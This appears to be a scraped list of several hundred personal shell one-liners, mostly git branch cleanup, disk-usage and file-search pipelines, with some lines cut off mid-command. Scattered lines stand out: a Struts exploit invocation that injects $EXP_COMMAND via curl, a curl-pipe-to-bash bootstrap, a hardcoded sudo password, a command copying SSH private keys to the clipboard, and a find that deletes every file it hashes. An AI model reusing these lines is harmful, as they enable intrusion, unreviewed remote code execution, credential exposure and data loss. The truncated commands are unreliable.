git branch --merged | grep -v -e 'master$' | grep -v 'staging$' | grep -v '^\*'
git branch --merged | grep -v 'master' | grep -v 'develop' | xargs -n 1 git branch -d
git branch --merged | grep -v 'master' | cut -c 3- | xargs git branch -d
git branch --merged | grep -v 'master$' | grep -v 'production$' | xargs git branch -d
git branch --merged | grep -v '^.* master$' | grep -v '^.* develop' | xargs git branch -d
git branch --merged | grep -v '^*' | grep -v '^ master$' | xargs git branch -d
git branch --merged | grep -v '^* master$' | grep -v '^ master$' | xargs git branch -d && git remote prune origin
git branch --merged | grep -v '^* master$' | grep -v '^ master$' | xargs git branch -d
git branch --merged | grep -v '\*' | grep -v master | xargs -n1 git branch -D
git branch --merged | grep -v '\*' | grep -v master | xargs -n 1 git branch -d
git branch --merged | grep -v '\*' | grep -v 'master' | grep -v 'develop'
git branch --merged | grep -v '\*' | grep -v '^ master$' | xargs -n 1 git branch -d
git branch --merged | grep -v '*' | grep -v 'master' | xargs -I % git branch -d %
git branch --merged | grep -Ev 'master|\*' | xargs git branch -D
git branch --merged | grep -Ev '(^\*|master)' | xargs git branch -d
git branch --merged | grep -Ev '(^\*|develop)' | xargs git branch -d
git branch --merged | grep --extended-regexp --invert-match 'master|\*' | xargs git branch -d
git branch --merged | egrep -v 'master|develop' | xargs git branch -d
git branch --merged | egrep -v '(^\*|master)' | xargs git branch -d
git branch --merged | egrep -v '(^\*|master)' | xargs git branch -D
git branch --merged | egrep -v '(^\*|master)' | xargs -r git branch -d
git branch --merged source | grep -v source | grep -v master | xargs git branch -d
git branch --merged origin/master | grep -v \* | grep DD | xargs git branch -D
git branch --merged master | grep -v master | grep -v stable | xargs git branch -d; git branch-cleanup
git branch --merged master | grep -v master | cut -d/ -f2- | xargs -n 1 git push --delete origin
git branch --merged master | grep -v -E '^(\\* | master$)' | xargs -n 1 git branch -d
git branch --merged master | grep -v 'master\|release' | xargs git branch -d && git remote prune origin
git branch --merged master | grep -v 'master\|*' | xargs -n 1 git branch -d;
git branch --merged master | grep -v 'master$' | grep -v 'production$' | xargs git branch -d
git branch --merged master | grep -v '^\*\| master' | xargs -n 1 git branch -d
git branch --merged master | cut -c 3- | egrep -v '^master$' | xargs -n 1 git branch -d
git branch --merged master --no-color | grep -v master | grep -v stable | xargs git branch -d
git branch --merged develop | grep -v master | grep -v develop | xargs git branch -d
git branch --merged develop --no-color | grep -v master | grep -v develop | xargs git branch -d
git branch --list | cat | fzf -m | xargs git branch -D $1
git branch --all | peco | sed 's/remotes\/origin\///g' | xargs git checkout
git branch --all --remotes | cut -c 3- | rev | cut -d \
git bra | grep -v develop | awk '{print $1}' | xargs git bra -d
git br | grep --color=never 'origin/.*: gone]' | awk '{print $1}' | xargs git branch -D
git br --merged | grep -v ^* | cut -c3- | xargs git br -d
git add --all; git commit -m'emergency commit'; git branch | grep '*' | cut -d' ' -f2 | xargs git push origin
git --no-pager log --oneline | ipt | cut -d ' ' -f 1 | xargs git checkout
git --no-pager log --oneline | ipt | cut -d ' ' -f 1 | xargs -o git rebase -i
git --no-pager branch -vv | grep ': gone]' | awk '{print \$1}' | xargs git branch -D
ghq list -p | ag -v vendor | peco | while read LINE; do cd $LINE; done
gfind . -regex '.*\(\.git\|node_modules\)' -prune -o -printf '%b\t%h/%f\n' | sort -n | grep -v '^0'
gfcnm | grep -e 'rb$' | grep -v 'schema' | xargs bundle exec rubocop --rails -aD
gf-master && git branch --merged | grep -v master | grep -v develop | xargs git branch -d
get_pods_colorized --all-namespaces -owide | tail -n+2 | grep -v Running | sort -k8
get_iplayer --nopurge --nocopyright | grcat conf.iplayer | sed 's/BBC.*//p' | uniq -d
get_iplayer --nopurge --nocopyright --type=tv --since=24 | grcat conf.iplayer | sed 's/BBC.*//p' | uniq -d
get_iplayer --nopurge --nocopyright --since=48 | grcat conf.iplayer | sed 's/BBC.*//p' | uniq -d
get_iplayer --nocopyright --nopurge --category=Science | grcat conf.iplayer | sed 's/BBC.*//p' | uniq -d
get_iplayer --nocopyright --nopurge --category=Nature | grcat conf.iplayer | sed 's/BBC.*//p' | uniq -d
get_iplayer --nocopyright --nopurge --category=History | grcat conf.iplayer | sed 's/BBC.*//p' | uniq -d
get_iplayer --nocopyright --nopurge --category=Film | grcat conf.iplayer | sed 's/BBC.*//p' | uniq -d
get_iplayer --nocopyright --nopurge --category=Drama | grcat conf.iplayer | sed 's/BBC.*//p' | uniq -d
gem search -l | sed 's/(.*)\(.*\)/ /' | sed '/./!d' | sed '/^.*LOCAL.*$/d'
gem list|sed 's/(//'|sed 's/)//'|awk '{print \
gdu -sb -t 100000 err.txt generated.file succ.txt | gsort -nr | gnumfmt --to=iec-i | column -t
gd develop --name-only | grep -v 'db/schema.rb$' | grep '.*.rb$' | xargs spring rubocop -a
gcloud config set account \`gals | rg @ | fzf | awk '{print \$2}'\`
gbr -l --merged|grep -v ' master '|awk '{print \$1}'|xargs git branch -d
gbn | tr -d '\r\n' |tee /dev/stderr | pbcopy
gb --merged | grep -v '\*' | grep -v master | xargs -n 1 git branch -d && g remote prune origin
gb --merged | egrep -v '(^\*|master)' | xargs git branch -d
g4 opened | grep -v default | cut -f 5 -d ' ' | sort -u
g-s-p | grep '^ D ' | sed 's/^\sD\s//' | xargs git rm --ignore-unmatch -r -f --
g-s-p | grep '^ D ' | sed 's/^\sD\s//' | xargs git rm --cached --ignore-unmatch -r -f --
g status | grep modified | cut -d':' -f2 | xargs git rm
g status | grep modified | cut -d':' -f2 | xargs git add
g status | grep deleted | cut -d':' -f2 | xargs git rm
g status | grep deleted | cut -d':' -f2 | xargs git add
g show | grep '\(console.\|window.\|git\)'
g remote prune origin && git br -vv | grep gone | cut -d' ' -f3 | sed -e 's/'\$(echo \
g diff | grep '\(console.\|window.\|git\)'
g branch -vv | cut -c 3- | awk '\$3 !~/\[/ { print \$1 }' | xargs -n 1 git branch -D
g br | grep -v develop | grep -v master | xargs git branch -D
fzf | tr '\n' '\0' | xargs -0 realpath | tee >(xclip -i -selection clipboard) >(xclip -i)
fzf --preview '[[ $(file --mime {}) =~ binary ]] && echo {} is a binary file || (highlight -O ansi {}) 2> /dev/null | head -500
fzf --preview '(bat --style=numbers --color=always {} || cat {}) 2> /dev/null | head -500'
function f() { kill -9 $(ps aux | grep '$1' | grep -v grep | awk '{print $2}') }; f
function _grep1() { grep -nr $1 | grep -v tags | grep -v cscope | grep $1;}; _grep1
free -lh | egrep 'total|used|free' -A5
free -h | head -n1; while [[ 1 ]]; do free -h | tail -n2 | head -n1; sleep 1; done
fortune | cowsay -f $(ls /usr/local/Cellar/cowsay/3.03/share/cows|gshuf -n1) | lolcat
fortune bofh-excuses | cowsay -f $(ls /usr/share/cowsay/cows/ | shuf -n 1) | lolcat
fortune 2> /dev/null | cowsay 2> /dev/null || true
fortune -a | fmt -80 -s | cowsay -$(shuf -n 1 -e b d g p s t w y) -f $(shuf -n 1 -e $(cowsay -l | tail -n +2)) -n
fortune -a | fmt -80 -s | $(shuf -n 1 -e cowsay cowthink) -$(shuf -n 1 -e b d g p s t w y) -f $(shuf -n 1 -e $(cowsay -l | tail -n +2)) -n
for x in `grep -i mobilitymap l*/h*/a*07 | awk '{print $1}' | sort -u`; do echo $x; grep $x l*/h*/a*07 | wc; echo; nslookup $x; done
for x in `git status --porcelain | grep UU | awk '{print $2}' | grep ${1:-pom.xml}`; do ${2:-git checkout ORIG_HEAD} -- $x; done
for user in \$(grep -v ^# /etc/auto.home | grep -v ^\* | awk '{print \$1}'| sort); do if [ ! \
for s in \$(tmux list-sessions | awk '{print \$1}' | rg ':' -r '' | fzf -m); do tmux kill-session -t \$s; done;
for remote in `git remote|grep -E lab\|hub\|origin`; do git push $remote --all; git push $remote --tags; done
for p in `tp | tail +2 | head -9 | awk '{print $1}'`; do clear; echo $p; t project:$p +READY; read; done
for item in $(set | grep AWS | grep KEY | awk -F=
for id in \$(lsof | grep snd | awk '{print \$2}' | sort -u); do kill \$id; done; pulseaudio -k
for i in {1..10}; do /usr/bin/time -p $1; done 2>&1 | ag real | sed -e 's/real //' | awk '{sum += $1} END {print sum / NR}'
for i in G M K; do du -ah | grep [0-9]\$i | sort -nr -k 1; done | head -n 10
for i in G M K; do du -ah | grep [0-9]$i | sort -nr -k 1; done | head -n 11
for i in G M K; do /usr/bin/du -ah | grep [0-9]$i | sort -nr -k 1; done | head -n 11
for c in \`brew cask list\`; do ! brew cask info \$c | grep -qF 'Not installed' || brew cask install \$c; done
for c in $(set | egrep '^C_' | cut -f 1 -d = | xargs); do printf \
for branch in `git branch -a | grep remotes | grep -v HEAD | grep -v master`; do git branch --track ${branch##*/} $branch; done
for FILE in $(git ls-files) ; do git blame $FILE | grep 'Krystian' | grep 'TODO'; done | less
fly -t garden-ci workers | grep stalled | awk '{print \$1}' | xargs -n1 fly -t garden-ci pw -w
find ~/audio/samples -maxdepth 1 -type f | sort -R | head -n 1 | xargs play
find ~/Music/C64Music -name *.sid| sort -R| head -n1| xargs sidplay2
find ~/Images/Screenshots | sort | tail -n 1 | xargs feh
find ~/Documents/REPO -type d -name .git | xargs -n 1 dirname | sort | while read line; do echo $line && cd $line && git pull; done
find ~/.ssh -name '*.pem' | fzy | xargs cat | pbcopy
find ~+ -type f -exec file -i '{}' \; | tee /tmp/findx | grep image | cut -d: -f1
find data/new-music/*/* -maxdepth 0 | shuf | tr '\n' '\0' | xargs -0 -i cp -rv --no-clobber {} /media/usb/music/
find /var/log/paludis -mtime -2 | xargs egrep -wi failed\|error\|incorrect
find /usr/share/icons/gnome -type f | sort -u | grep ico | grep
find /sys/devices -name driver -print0|xargs -0 ls -l|cut -d' ' -f9-|sed -e 's/\.\.\///g'
find /proc -maxdepth 1 | grep [0-9] | wc ; ps | wc
find /home/kerwin/screen/ | shuf | head -1 | xargs -I{} feh --bg-scale {}
find /home/kerwin/Downloads/screen/ | shuf | head -1 | xargs -I{} feh --bg-scale {}
find .|grep -v .svn|grep -v .git|grep
find ./spec -name '*.rb' | grep -v .git | peco | xargs
find ./err.txt ./generated.file ./succ.txt -type f -exec md5 {} + | awk '{print \$1}' | sort | md5
find ./ -type f | grep -vE '.svn/|.git/' | xargs -n1 perl -p -i -e 's/\r\n/\n/g'
find . | xargs wc -l | gsort | less
find . | xargs grep -n TODO | grep -v image | grep -v checkpoint
find . | grep swp | sed -e 's/.swp//' | sed -e 's/\/\./\//'
find . | grep -v node_modules | grep -v coverage | grep -v docker $@
find . | grep -v node_modules | grep -v .git | grep
find . | grep -v .git | peco | xargs
find . | fzf | xargs echo -n | xclip -selection clipboard
find . -type f|fgrep -v '/.'|sort|grep
find . -type f | xargs du -sh | sort -rn | head -n25
find . -type f | xargs du -h | sort -hr | head
find . -type f | shuf | head -n 1 | xargs mpv
find . -type f | sed 's/.*\.//' | sort | uniq -c
find . -type f | perl -ne 'print $1 if m/\.([^.\/]+)$/' | sort | uniq -c
find . -type f | grep -vE '$FIND_EXCLUDE' | sed 's/ /\\\ /g' | grep $1
find . -type f -size +10M -exec du -h {} + | sort -r -h | head -n 100 | less -S
find . -type f -printf '%TY-%Tm-%Td %TR %p\n' 2>/dev/null | grep -v '.git' | sort -n | tail -n 50
find . -type f -printf '%T@ %p\n' | sort -n | tail -1 | cut -f2- -d' '
find . -type f -printf '%T@ %P\n' | sort -n | awk '{print $1}' | tail -1
find . -type f -print0|xargs -0 du -k|sort -n|tail
find . -type f -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate
find . -type f -print0 | xargs -0 du -h | sort -rh | head -n 10
find . -type f -print0 | xargs -0 du -h | sort -hr | head -40
find . -type f -print0 | xargs -0 du -h | sort -hr | head -20
find . -type f -print0 | du -h --files0-from=- | sort -hr | head -n 10
find . -type f -print | fgrep -v /.git/ | fgrep -v .class | fgrep -v /.m2/ > xref.all
find . -type f -name '*.*' -printf '%f\n'|sed 's/.*\.\([^.]*\)$/\1/'|sort|uniq
find . -type f -exec stat --format '%Y :%y %n' {} \; | sort -nr | cut -d: -f2- | head
find . -type f -exec md5 '{}' ';' | sort | uniq -f 3 -d | sed -e \
find . -type f -exec du {} \; 2>/dev/null | sort -n | tail -n 10 | xargs -n 1 du -h 2>/dev/null
find . -type d | sed -e 1d -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|-/' | /usr/local/bin/bbedit -t `pwd`
find . -type d -name .git | tr './' ' ' | awk '{print $1}' | xargs -I @@ bash -c 'cd @@ && echo @@ && git checkout master && git up && cd ..'
find . -regex '.*\.c\|.*\.h\|.*\.S\|.*\.s'
find . -regex '.*\.\(c\|cpp\|h\)$' -print | xargs grep --color=auto -n
find . -path './vendor' -prune -o -print | sed -n '/\.go$/p;/\.css$/p;/\.html$/p' | xargs cat | wc -l
find . -path './vendor' -prune -o -print | sed -n '/\.go$/p' | xargs cat | wc -l
find . -not \( -name .git* -prune \) -type f | xargs wc -l | sort -r | head -n 20
find . -not -type d -exec file '{}' ';' | grep CRLF | grep -o --color=never '^.*: ' | sed 's/..$//'
find . -name include -type d | xargs -I dir find dir -name *.h| sed 's/\.\///;s/\(.*\)\/.*/\1/;s/management_libs\/.../management_libs\/current/' | uniq
find . -name \*.csproj | xargs svn diff | tr -d \\r | vim -R -
find . -name .directory -print0 | xargs -0 /bin/rm -fv ; find . -name Thumbs.db -print0 | xargs -0 /bin/rm -fv ; find . -type d -empty -print0 | xargs -0 /bin/rmdir -pv --ignore-fail-on-non-empty
find . -name *.sass-cache | xargs rm -rf;find app -name *.css | xargs rm;find app -name *.css.map | xargs rm
find . -name '*erb' | xargs ruby -e 'ARGV.each { |i| puts \
find . -name '*.xcworkspace' -maxdepth 2 | grep -v xcodeproj | head -n 1 | xargs open
find . -name '*.rb' -not -path '*test*' -not -path '*spec*' | xargs wc -l | sort -rn | head
find . -name '*.pyc' | xargs rm -f || true
find . -name '*.php' | grep -v deployment | grep -v release | \\xargs ctags --php-types=f
find . -name '*.js' | grep -v 'constants\|config' | xargs wc -l
find . -name '*.jpg' | xargs jpegoptim ; find . -name '*.jpeg' | xargs jpegoptim ; find . -name '*.png' | xargs optipng
find . -name '*.css' -exec csslint --quiet --format=compact ${csslint_ignores} \\{\\} \\; | grep -v '\\(Warning\\|Is the file empty\\|^\$\\)'
find . -maxdepth 4 -name '\.[^.]*' -prune -o -print | sed -e 's/\.\///' -e 's/[^/^|]*\// --- /g' -e 's/--- / | /g '
find . -maxdepth 1 -type l -printf '%f|%l\n' | column -s'|' -t
find . -maxdepth 1 -type f | cut -d '/' -f2- | grep -iE '^\.' | xargs ls -lah --color=auto
find . -maxdepth 1 -type d -print | xargs du -h | sort -h | tail -n 20
find . -maxdepth 1 -type d -print | xargs -i du -sm {} | sort -rn | head -n 11
find . -iwholename '*\.git\/*' -prune -o -type f -printf '%s %p\n' | numfmt --to=iec-i | sort -hr | head -n10
find . -iname '*.jpg' -type f -print0 | xargs -0 -I{} identify -format '%wx%h\n' {} | sort | uniq
find . -exec stat -f '%m%t%Sm %N' {} + | sort -n | cut -f2- | head -n 50
find . -d 1 | grep xcodeproj | head -n 1 | xargs open --fresh --background
find . ! -path './node_modules/*' -name '*.vue' | xargs cat | grep -v ^$ | wc -l
find . ! -path './node_modules/*' -name '*.tsx' | xargs cat | grep -v ^$ | wc -l
find . ! -path './node_modules/*' -name '*.ts' | xargs cat | grep -v ^$ | wc -l
find . ! -path './node_modules/*' -name '*.scss' | xargs cat | grep -v ^$ | wc -l
find . ! -path './node_modules/*' -name '*.jsx' | xargs cat | grep -v ^$ | wc -l
find . ! -path './node_modules/*' -name '*.js' | xargs cat | grep -v ^$ | wc -l
find . ! -path './node_modules/*' -name '*.html' | xargs cat | grep -v ^$ | wc -l
find . ! -name . -prune -type f | xargs -I% grep -a ^\#\!.*\n % | sort | uniq -c
find -type f | xmv .; find -type d | escapepath | xargs rm -rf
find -type f | grep -v .git/ | grep orig | xargs rm
find -type f -exec stat --format '%Y :%y %n' {} \; | sort -nr | cut -d: -f2- | head
find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 | cut -c 35-
find -type f -exec md5sum '{}' ';' -delete| sort | uniq --all-repeated=separate -w 33 | cut -c 35-
find -type f -exec ls -s {} \; | sort -n -r | head -5 | pv
find */ | cut -d/ -f1 | uniq -c | sort -rn
find $MAILDIR | grep -P new\/.? | sed 's@.*mail/\(.*\)/new.*@\1@' | awk '{a[\$1]++}END{for(i in a){print a[i] \
find $(xcrun simctl appinfo booted se.accumbo.app01 | grep DataContainer | awk '{ print $3 }' | sed -e 's/\
fileutil --gfs_user=codeview-dev ls -l /cns/mh-d/home/codeview-dev/user-data/trace/| tail -1 | awk '{print \$8}' | xargs fileutil --gfs_user=codeview-dev ls -l
file **/*.jpeg **/*.jpg(.N) | grep -v JPEG; file **/*.gif(.N) | grep -v GIF; file **/*.png(.N) | grep -v PNG
fgrep -v /target/ | fgrep -v /.hg/ | fgrep -v /.git/ | fgrep -v /.idea/
fdroid update -v --pretty 2>&1 >/dev/null | grep -v 'has no packages\|know when\|from cache' && rm -f $MYFDROIDDATA/*.apk
fd -tf . --print0 | xargs -0 sha1sum | sort | uniq -w40 --all-repeated=separate
fc-list | cut -d : -f 2 | sort -u | uniq
fc -ln | tail -n 1 | sed -E 's@^\s+@@g' | clip
fc -l | tail -n 1 | sed -e 's/^[0-9 ]\+//' | cb
fc -l -n -r -3000 | awk '{\$1=\$1};1' | fzf --print0 | xsel -b -i
f(){date +%s | sha256sum | base64 | head -c $1 ; echo}; f
f() { git branch | grep $1 | sed s/*\ // | xargs git checkout && git status -sb }; f
export SSH_AUTH_SOCK=\$(find /tmp/ssh-* -user $USER -name agent\* -printf '%T@ %p\n' 2>/dev/null | sort -k 1nr | sed 's/^[^ ]* //' | head -n 1)
export SSH_AUTH_SOCK=$HOME/.ssh/ssh_auth_sock; LD_LIBRARY_PATH=$HOME/local/lib:$LD_LIBRARY_PATH; ($HOME/local/bin/tmux ls | grep -vq attached && $HOME/local/bin/tmux -CC attach) || $HOME/local/bin/tmux -CC
export SSH_AUTH_SOCK=$(find /tmp/ssh-* -user $USER -name agent\* -printf '%T@ %p\n' 2>/dev/null | sort -k 1nr | sed 's/^[^ ]* //' | head -n 1)
export ROS_MASTER_URI=http://alan1_wifi:11311 ; export ROBOT=robot ; export ROS_IP=`ifconfig em1 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'`
export ROS_MASTER_URI=http://alan1:11311 ; export ROBOT=robot ; export ROS_IP=`ifconfig em1 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'`
export POD_NAME=$(kubectl get pods --namespace pn-push | grep parser | grep Running | awk
export ID=\$(docker ps | grep -v CONTAINER | awk '{print \$1}' | head -n 1); docker kill \$ID
export ID=\$(docker ps | grep -v CONTAINER | awk '{print \$1}' | head -n 1); docker exec -it \$ID /bin/bash
export $(cat .env | grep -v ^# | cut -d: -f2 | xargs)
exim4 -bp| grep frozen| awk '{print $3}' | xargs exim4 -Mrm
exiftool -createdate err.txt generated.file succ.txt | grep -o '\d\d\d\d:\d\d:\d\d' | sort | uniq -c
exiftool -createdate err.txt generated.file succ.txt | grep -o '\d\d\d\d:\d\d:\d\d' | sort | sed -e 1b -e '$!d'
exa -T -I '.git|node_modules|bower_components|.DS_Store' --group-directories-first
exa --color=always -F | grep '\/' | sed 's%/$%%g' | sort --ignore-case
eval $(history | cut -c 8- | uniq | peco)
env|grep MON; env|grep POST; env|grep RUNTIME
env | pt M2 && env | pt GRADLE && env | pt GO
env | grep AWS | while read line; do var=$(echo $line|cut -f1 -d
env | grep '^AWS' | awk -F'=' '{print \$1}' | xargs -i echo 'unset {}' > /tmp/aws-session-purge; . /tmp/aws-session-purge
env | egrep 'FLAG|LIB' | sort
env ifconfig -v \$(env ifconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active' | egrep -o -m 1 '^[^\t:]+')
elastic-mapreduce --ssh `elastic-mapreduce | grep WAITING | head -n 1 | awk '{print $1}'`
egrep -v 'jr_lock_page|jr_unlock_page|x_key_based_pool_release|send_sync_remote_entries'
egrep -r '(login|attempt|auth|success):' /var/log
egrep -io '[?&](k|p|q|query)=[a-zA-Z0-9+_%-]+'
egrep -i 'bug|error|warn|fatal'
egrep --color -w 'ERROR|SEVERE|WARN|Exception'
egrep '^bind' ~/config/i3/config | cut -d '\'' '\'' -f 2- | sed '\''s/ /\t/'\'' | column -ts $'\''\t'\''
egrep '^@[^ ]+' | tr ' ' '\n' | sort | uniq -c
egrep '(^|[[:space:]])[456][[:digit:]]{3}((-|[[:space:]])?[[:digit:]]{4}){3}([[:space:]]|$)'
echo;spdtest --list 2>&1 | head -n30 | grep --color=always -P '(\d+)\.(\d+)\skm|(\d+)(?=\))';echo
echo;echo '--> pip list -lv --format columns' | tee $HOME/pip-list; pip list -lv --format columns | pv -C | tee -a $HOME/pip-list
echo;echo '--> npm -gdls ll' | tee $HOME/npm-g-list; npm -gdls ll | pv -C | tee -a $HOME/npm-g-list
echo;echo '--> gem list -daV' | tee $HOME/gem-list; gem list -daV | pv -C | tee -a $HOME/gem-list;echo
echo; ifconfig | grep -w inet | tr : ' ' | awk '! / 127.0.0.1 / { print \$3 }' ; echo; python -m SimpleHTTPServer
echo | gcc -E -xc -dM - | sort | uniq
echo viewing videos && find . -type f -exec file --mime {} \; | grep 'video/' | cut -d ':' -f1 | xargs -d'\n' -n1 mpv --keep-open
echo viewing images && find . -type f -exec file --mime {} \; | grep 'image/' | cut -d ':' -f1 | xargs -d '\n' sxiv -a
echo openssl rand -base64 8 |md5 |head -c8 | pbcopy
echo ls | ftp -a $PKG_PATH | sed 's/.*\ //g' | grep -i
echo exit | strace bash -li |& less | grep ^open
echo `rbenv which ruby|sed -e 's/bin\/ruby//'`lib/ruby/gems/`rv|cut -d'p' -f1|sed
echo `nproc`-1 | bc | xargs echo | xargs make -j
echo \$EXP_MESSAGE'\n\n' &| cat struts-exploit-headers.txt| sed 's/COMMAND/'\$EXP_COMMAND'/' | xargs curl --http1.0 \$JAVA_GOOF_DEBUG $JAVA_GOOF_URL -H
echo You can not nest vim sessions. Use nvr [-l|-o|-O|-p]
echo Super+R - rotate \| C-S-E - split vert \| C-S-O - split horiz \| C-S-W - close panel
echo Dependencies: && pacman -Qd | wc -l && echo Explicitly: && pacman -Qe | wc -l && echo Total: && pacman -Q | wc -l
echo 999999 | sudo tee -a /proc/sys/fs/inotify/max_user_watches && echo 999999 | sudo tee -a /proc/sys/fs/inotify/max_queued_events && echo 999999 | sudo tee -a /proc/sys/fs/inotify/max_user_instances && watchman shutdown-server
echo 123456 | sudo -S netstat -antp | grep -v :8787 | grep -v :3306
echo /sbin/ifconfig eth1 | grep inet | cut -d':' -f2 | cut -d' ' -f1
echo -e \`pstree | sed 's/\\\\(.*\\\\)/\\\\1\\\\\\\\n/' | sed 's/-httpd/-\\\\\\\\E\\\\[31;1mhttpd\\\\\\\\E\\[0m/' | sed 's/-mysqld/-\\\\\\\\E\\\\[32;1mmysqld\\\\\\\\E\\[0m/'\`
echo -e '\e[31m\e[1mNo.\tAlias\t\tCommand\e[0m';grep alias ~/.bashrc.d/*.bash |cut -d' ' -f2- | sed 's/\=/\t\t\t/g' | nl -w 2
echo -e '\e[31m\e[1mNo.\tAlias\t\tCommand\e[0m';grep alias ~/.bashrc |cut -d' ' -f2- | sed 's/\=/\t\t/g' | nl -w 2
echo ***EAT MOST OF RAM*** && ps auxf | sort -nr -k 4 && echo ***TOP TEN BELOW*** && ps auxf | sort -nr -k 4 | head -10
echo 'npm run fmt|format'; npm run \$(npm run | grep -E '^ fmt|^ format')
echo 'docker clean images' docker images | grep none | awk '{print \$3}' | xargs sudo docker rmi -f
echo 'displaying ssh tunnels' && sudo lsof -i -n | awk 'NR==1 || /ssh/'
echo 'curl https://raw.githubusercontent.com/craveytrain/dotfiles/master/bootstrap | bash' | pbcopy | echo '=> Dotfiles bootstrapper copied to clipboard.'
echo 'Updating python packages'; pip list --outdated --format columns | tail -n +3 | awk '{ print $1}' | xargs -n 1 pip install -U
echo 'Finding latest under current dir/subdirs ' && find . -type f -printf '%T@ %p\n' | sort -n | tail -1 | cut -f2- -d\
echo 'Finding first file generated under current dir/subdirs ' && find . -type f -printf '%T@ %p\n' | sort -n | head -1 | cut -f2- -d\
echo $PATH | tr ':' '\n' | sort | uniq -u
echo $(ip addr show wlp4s0 | grep 'inet ' | awk '{print $2}' | cut -f1 -d'/')
echo $(fc -ln -2) | tail -n 1 | cut -d' ' -f2- |xargs $1
echo $(echo $(git config --get remote.origin.url) | rev | cut -c 5- | rev)/commit/$(git rev-parse HEAD)
ec2list | peco | awk '{print \$3}' | xargs -o -n 1 ssh -l ec2-user
ec2list --profile smartyoyaku | peco | awk '{print \$3}' | xargs -o -n 1 ssh -l root
ec2dvol | grep available | cut -f 2 | xargs -n 1 ec2-delete-volume
du | sort -nr | cut -f2- | xargs du -hs
du | sort -n | cut -f2- | xargs du -hs
du -skh ./err.txt ./generated.file ./succ.txt | sort -h | grep -v total && du -cskh ./err.txt ./generated.file ./succ.txt | grep total
du -skh ./err.txt ./generated.file ./succ.txt | sort -h | grep -v total && du -cskh ./err.txt ./generated.file ./succ.txt | grep --color=never total
du -sk *| sort -n | cut -f2 |xargs -d'\n' du -hs $1
du -sk err.txt generated.file succ.txt | sort -rn | head -11 | perl -ne
du -sk err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs -d \
du -sk err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs -d '\n' du -sh
du -sk (*|.*) | sort -rn | awk '{\$1=\
du -sh err.txt generated.file succ.txt | egrep -v '[0-9]+(\.[0-9]+)?(K|B)' | egrep -v '[^0-9][0-9](\.[0-9]+)?M'
du -sb -t 100000 err.txt generated.file succ.txt | sort -nr | numfmt --to=iec-i | column -t
du -s ./err.txt ./generated.file ./succ.txt | sort -n| cut -f 2-|xargs -i du -sh {}
du -s ./err.txt ./generated.file ./succ.txt | sort -n | cut -f 2- | xargs du -sh
du -s ./err.txt ./generated.file ./succ.txt | sort -n | cut -f 2- | xargs -Ix du -sh x
du -s -k | sort -nr| cut -f2| xargs-d '\n' du -sh 2>/dev/null
du -s *|sort -nr|cut -f 2-|while read a;do du -hs $a;done
du -s err.txt generated.file succ.txt | sort -nr | awk '{print \$2}' | xargs du -sh
du -s err.txt generated.file succ.txt | sort -n | cut -f 2- | xargs -Ix du -hs x
du -ks err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs du -sh
du -ks err.txt generated.file succ.txt | sort -nr | cut -f2 | sed
du -kh -d1 | sort -n | cut -f2 | xargs -d '\n' du -sh
du -ka --max-depth=1 . | sort -nr | cut -f2 | xargs -d '\n' du -sh
du -k | sort -nr | cut -f2 | xargs -d'\n' du -sh
du -k | sort -n | tail -n 200 | perl -ne 'if ( /^(\d+)\s+(.*\$)/){\$l=log(\$1+.1);\$m=int(\$l/log(1024)); printf (\
du -k | sort -n | tail -n 200 | perl -ne 'if ( /^(\\d+)\\s+(.*$)/){\$l=log(\$1+.1);\$m=int(\$l/log(1024)); printf (\
du -k -d 1 err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs du -sh
du -k */ | sort -rn | cut -f2 | xargs -d '\n' du -chs
du -k err.txt generated.file succ.txt | sort -rn | cut -f2 | xargs -d '\n' du -chs
du -k err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs du -sh
du -k err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs -d '\n' du -sh
du -k err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs -d
du -k err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs -I '{}' du -sh '{}'
du -hsm err.txt generated.file succ.txt | fzf | cut -d$'\t' -f2 | xargs rm
du -h . | sort -hr| head -n 6 | sed '1 d'
du -d2 | sort -n | cut -f2- | xargs du -sh
du -d1 | sort -nr | cut -f2- | xargs du -hs
du -d1 | sort -n | awk '{print \$2}' | xargs du -hd0
du -d1 | sort -n | awk '{print \$2}' | xargs -n1 du -h -d0
du -cks err.txt generated.file succ.txt | sort -rn | egrep -v '^0|total'
du -cks err.txt generated.file succ.txt | sort -nr | grep -v total | head -n 10
du -all|grep -v '/$'|sort -nr|less
du -ah -d 1 | sort -h | sed s/\\t\.\\//\\t/g | tail
du -ad1 | head -n-1 | sort -hr | head
du -aBM 2>/dev/null | sort -nr | head -n 50 | less
du --max-depth=1 | sort -nr | cut -f2- | xargs -I {} du -hs {}
du --max-depth=1 | sort -n | tail | head -9
du --max-depth=1 | sort -n | cut -f2- | xargs du -hs
du --max-depth=1 | sort -n | cut -f2- | xargs du -ahs
du --max-depth=1 -k | sort -nr | cut -f2 | xargs -d '\n' du -sh
du --max-depth=1 -k err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs -d '\n' du -sh
du --max-depth 1 | sort -n | cut -f 2 | xargs -d
du --block-size=1 -a $(pwd) | sort -n -r | head -n 20 | numfmt --to=iec-i
dstat -tlampM $(lsb_release -r -s 2>/dev/null|grep -q '^5' && echo 'app' || echo 'top_cpu')
drill myip.opendns.com @resolver1.opendns.com | awk '!/;;/ && /IN/' | head -n 1 | awk '{ print \$NF }'
drill +short myip.opendns.com @resolver1.opendns.com | grep IN | tac | cut -f5 -s
dpsa | grep Exit | awk '{print \$1}' | xargs $dock_prefix docker rm
dpsa | cut -d' ' -f1 | tail -n +2 | xargs -n1 docker rm -f
dplm | grep FINISHED | awk '/df-.+/{ print $3}' | xargs -L1 datapipeline --delete --list-runs --id
dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P
dpkg -l |awk '{print \$2}'|sed -e 's/\:\(i386\|amd64\)$//'
dpkg -l | tail -n +6 | awk '{ print \$2 }' | grep
